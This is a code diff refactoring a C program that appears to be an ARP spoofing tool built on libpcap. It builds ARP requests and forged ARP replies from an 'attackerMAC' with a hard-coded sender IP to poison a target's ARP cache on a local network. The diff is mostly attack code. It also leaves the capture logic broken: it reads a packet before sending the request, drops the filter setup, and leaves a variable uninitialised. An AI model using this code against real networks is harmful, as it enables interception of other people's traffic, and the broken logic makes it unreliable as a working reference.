@@ -33,7 +33,7 @@
 
 #define INPUT_LENGTH 100
 
-uint8_t * broad_eth_cast = "\xff\xff\xff\xff\xff\xff";
+const char* broad_eth_cast = "\xff\xff\xff\xff\xff\xff";
 uint8_t	null_get_eth[] = {0, 0, 0, 0, 0, 0};
 
 void usage() {
@@ -44,7 +44,7 @@ void usage() {
 
 
 /* ==========================WHOLE HEADER=============================== */
-struct ethhdr {
+struct eth_hdr {
 	uint8_t ethdest[ETH_ALEN]; /* Destination MAC Address */
 	uint8_t ethsrc[ETH_ALEN]; /* Source MAC Address */
 	uint16_t e_type;
@@ -53,7 +53,7 @@ struct ethhdr {
 /** ARP Header */
 #define ARP_REQUEST 1 /* ARP Request */ 
 #define ARP_REPLY 2 /* ARP Reply */ 
-struct arphdr {
+struct arp_hdr {
 	uint16_t htype; /* Hardware Type */ 
     uint16_t ptype; /* Protocol Type */ 
     uint8_t hlen; /* Hardware Address Length */ 
@@ -65,22 +65,22 @@ struct arphdr {
     uint8_t tpa[ARP_IPLEN]; /* Target IP address */ 
 };
 
-struct whole_hdr {
-	uint8_t w_ethdest[ETH_ALEN]; /* Destination MAC Address */
-	uint8_t w_ethsrc[ETH_ALEN]; /* Source MAC Address */
-	uint16_t w_e_type;
+typedef struct {
+    uint8_t w_ethdest[ETH_ALEN]; /* Destination MAC Address */
+    uint8_t w_ethsrc[ETH_ALEN]; /* Source MAC Address */
+    uint16_t w_e_type;
 
-	uint16_t w_htype; /* Hardware Type */ 
+    uint16_t w_htype; /* Hardware Type */ 
     uint16_t w_ptype; /* Protocol Type */ 
     uint8_t w_hlen; /* Hardware Address Length */ 
     uint8_t w_plen; /* Protocol Address Length */ 
     uint16_t w_oper; /* Operation Code */ 
-    uint8_t w_sha[ARP_HWADD]; /* Sender hardware address */ 
-    uint8_t w_spa[ARP_IPLEN]; /* Sender IP address */ 
-    uint8_t w_tha[ARP_HWADD]; /* Target hardware address */ 
-    uint8_t w_tpa[ARP_IPLEN]; /* Target IP address */ 
-    uint8_t w_padding[ARP_PADD];
-}
+    unsigned char w_sha[ARP_HWADD]; /* Sender hardware address */ 
+    unsigned char w_spa[ARP_IPLEN]; /* Sender IP address */ 
+    unsigned char w_tha[ARP_HWADD]; /* Target hardware address */ 
+    unsigned char w_tpa[ARP_IPLEN]; /* Target IP address */ 
+    unsigned char w_padding[ARP_PADD];
+} whole_hdr;
 
 //sending: codes are at the below------------------------------------------
 whole_hdr * getMAC (pcap_t * handle, uint8_t * attackerMAC, uint8_t * tIP);
@@ -116,7 +116,7 @@ int getMacAddr(char * intfInput, char * buf) {
 /* ---------------------------------------------------------------------------------------- */
 
 /* --------------2. arp request----------------- */
-void arpRequest(pcap_t* handle, char* attackerMAC, uint8_t* tIPget) {
+void arpRequest(pcap_t* handle, char* attackerMAC, uint8_t * tIPget) {
 	whole_hdr pktReq;
 	pktReq.w_e_type = ETHERTYPE_ARP;
 
@@ -126,7 +126,7 @@ void arpRequest(pcap_t* handle, char* attackerMAC, uint8_t* tIPget) {
 	memcpy(pktReq.w_spa, "\xc0\xa8\x05\x97", 4);
 
 	memcpy(pktReq.w_tha, null_get_eth, 6);
-	memcpy(pktReq.arp_dstip, tIPget, 4);
+	memcpy(pktReq.w_tpa, tIPget, 4);
 	memset(pktReq.w_padding, 0, ARP_PADD);
 
 	pktReq.w_oper = 0x0100;
@@ -149,7 +149,7 @@ void arpReply(pcap_t * handle, uint8_t * ownEthernet, uint8_t * destin_eth, uint
 	memcpy(packet.w_spa, "\xc0\xa8\x05\x97", 4);
 
 	memcpy(packet.w_tha, destin_eth, 6);
-	memcpy(packet.arp_dstip, destin_ip, 4);
+	memcpy(packet.w_tpa, destin_ip, 4);
 	memset(packet.w_padding, 0, 18);
 
 	packet.w_oper = 0x0200;
@@ -168,12 +168,8 @@ int main(int argc, char* argv[]) {
 }
 
 
-whole_hdr *getMAC(pcap_t *handle, uint8_t* attackerMAC, uint8_t* tIP) {
-	whole_hdr * arpSend;
-	uint32_t netSniff;
-	const uint8_t *packet;
-	packet = pcap_next(handle, &pcPktHdr);
-	char filtering[] = "arp";
+whole_hdr * getMAC(pcap_t *handle, uint8_t* attackerMAC, uint8_t* tIP) {
+
 
 	struct pcap_pkthdr pcPktHdr;
 	/* struct pcap_pkthdr {
@@ -185,17 +181,19 @@ whole_hdr *getMAC(pcap_t *handle, uint8_t* attackerMAC, uint8_t* tIP) {
 	struct bpf_program bpfPro;
 	//filtering structure! It can compile, and use it!
 
+	whole_hdr * arpSend;
+
+	bpf_u_int32 netSniff;
+	const u_char *packet;
+	packet = pcap_next(handle, &pcPktHdr);
+	char filtering[] = "arp";
+
+
 	arpRequest(handle, attackerMAC, tIP); //sending the req
-	if((pcap_compile(handle, &bpfPro, filtering, 0, netSniff))==-1) { //int pcap_compile(pcap_t *p, struct bpf_program *fp, char *str, int optimize, bpf_u_int32 netmask)
-		return 1;
-	}
-	if((pcap_setfilter(handle, &bpfPro))==-1) { //int pcap_setfilter(pcap_t *p, struct bpf_program *fp)
-		return 1;
-	} //check the filtering errors
 
 	//pck--->grab!
 
-	arpSend = (struct whole_hdr *)(packet);
+	arpSend = (whole_hdr *)(packet);
 	for(int i=0; i<CHK_LEN; i++) {
 		printf("%02x:", arpSend->w_sha[i]);
 	}
